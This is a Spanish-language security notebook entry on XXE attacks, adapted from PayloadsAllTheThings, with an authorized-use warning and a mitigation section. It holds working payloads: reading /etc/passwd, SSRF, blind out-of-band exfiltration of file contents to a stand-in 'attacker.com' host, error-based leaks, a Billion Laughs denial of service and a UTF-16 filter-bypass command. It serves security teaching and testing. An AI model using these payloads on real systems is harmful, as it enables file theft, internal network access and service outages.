---
tags:
  - seguridad-web
  - owasp
  - xxe
aliases:
  - XXE
  - XML External Entity
---

# XXE (XML External Entity)

**El ataque XXE** afecta a aplicaciones que parsean XML y permiten entidades externas. Un atacante puede declarar entidades que obligan al parser a leer archivos del servidor, hacer peticiones de red (SSRF) o exfiltrar datos.

> [!warning] Uso autorizado
> Técnicas para pruebas en sistemas propios o con autorización explícita. Ver [[📜 Fuentes y Licencias]].

## ¿Cómo funciona?

XML permite definir **entidades** dentro de un DTD. Una entidad **externa** (marcada con `SYSTEM`) hace que el parser cargue contenido externo: archivos locales, URLs, etc. Si la aplicación parsea XML controlado por el usuario con resolución de entidades habilitada, ese contenido se inserta en la respuesta o se filtra fuera de banda.

| Tipo | Prefijo | Dónde se usa |
|---|---|---|
| Entidad general | `&nombre;` | En el contenido del documento XML |
| Entidad de parámetro | `%nombre;` | Solo dentro del DTD |

Prueba básica: el parser debe sustituir `&example;` por `Doe`.

```xml
<?xml version="1.0" ?>
<!DOCTYPE replace [<!ENTITY example "Doe"> ]>
<userInfo>
  <firstName>John</firstName>
  <lastName>&example;</lastName>
</userInfo>
```

El impacto: lectura de archivos sensibles, SSRF contra servicios internos, denegación de servicio y, en algunos casos, RCE (vía wrappers como `expect://`).

## Detección y pruebas

- Definir una entidad simple y comprobar si su valor aparece reflejado en la respuesta.
- Ayuda fijar `Content-Type: application/xml` en la petición.
- En endpoints **JSON**, cambiar el `Content-Type` a `application/xml` y enviar XML equivalente: a veces el backend acepta ambos.
- Si no hay reflejo (XXE **ciego**), probar carga de un recurso remoto controlado (callback DNS/HTTP).

## Explotación / payloads

### Lectura de archivos (XXE clásico)

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>
```

Variante con wrapper PHP (base64) para leer archivos que romperían el XML:

```xml
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<contacts><contact><name>&xxe;</name></contact></contacts>
```

### XInclude

Útil cuando no puedes controlar el bloque `DOCTYPE`:

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

### SSRF vía XXE

La entidad apunta a un servicio interno de la red:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://10.0.0.1/secret_pass.txt" >]>
<foo>&xxe;</foo>
```

### XXE ciego Out-of-Band (OOB)

Cuando no hay salida en la página, se exfiltra a un servidor del atacante usando un DTD externo:

```xml
<?xml version="1.0" ?>
<!DOCTYPE data SYSTEM "http://attacker.com/oob.dtd">
<data>&send;</data>
```

Contenido de `oob.dtd` (lee el archivo y lo manda en la URL):

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.com/?%file;'>">
%all;
```

### Error-based (con DTD remoto o local)

Filtra el contenido del archivo en un mensaje de error provocado al usarlo en una ruta inexistente:

```xml
<?xml version="1.0" ?>
<!DOCTYPE message [
  <!ENTITY % ext SYSTEM "http://attacker.com/ext.dtd">
  %ext;
]>
<message></message>
```

`ext.dtd`:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

Si no se permite salir a internet, puede reutilizarse un **DTD local** ya presente en el sistema (p. ej. `/usr/share/xml/fontconfig/fonts.dtd`) redefiniendo una de sus entidades de parámetro.

### Denegación de servicio (Billion Laughs)

> No ejecutar en producción: puede tumbar el servicio.

```xml
<!DOCTYPE data [
<!ENTITY a0 "dos" >
<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
<!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
]>
<data>&a3;</data>
```

### XXE en archivos exóticos

- **SVG**: insertar la entidad en un `<text>` o usar `xlink:href="expect://ls"`.
- **SOAP**: incrustar el `DOCTYPE` dentro de un `<![CDATA[ ... ]]>`.
- **DOCX / XLSX / PPTX** (Open XML): son ZIP; inyectar el payload en un `.xml` interno (p. ej. `xl/workbook.xml` o `word/document.xml`) y recomprimir con `zip -u` para conservar la firma válida.

### Bypass de WAF

Convertir el payload a UTF-16 para evadir filtros que solo inspeccionan UTF-8:

```bash
cat utf8exploit.xml | iconv -f UTF-8 -t UTF-16BE > utf16exploit.xml
```

## Mitigación

- **Deshabilitar DTDs y entidades externas** en el parser XML (la defensa más efectiva). Si el parser no permite desactivar DTDs por completo, deshabilitar al menos las entidades externas y la expansión de entidades de parámetro.
- Usar formatos/parsers menos peligrosos cuando sea posible (JSON).
- Mantener actualizadas las librerías de parseo XML.
- **Validación de entrada** y allowlist de elementos esperados.
- Configuraciones seguras conocidas: ver la *XML External Entity Prevention Cheat Sheet* de OWASP.

## Herramientas

- **XXEinjector** — explotación automática de XXE (directa y OOB).
- **xxeserv** — miniservidor web con soporte FTP para recibir payloads OOB.
- **oxml_xxe** — incrusta payloads XXE/XML en distintos formatos (DOCX, XLSX, SVG, PDF, etc.).

---
🔗 Relacionado: [[Inyección SQL (SQLi)]] · [[Inyección de comandos]] · [[Laboratorio DVWA (CTF)]] · [[Metasploit y Payload Reverse TCP]]
📚 Fuente: [PayloadsAllTheThings — XXE Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection) (MIT, © Swissky)
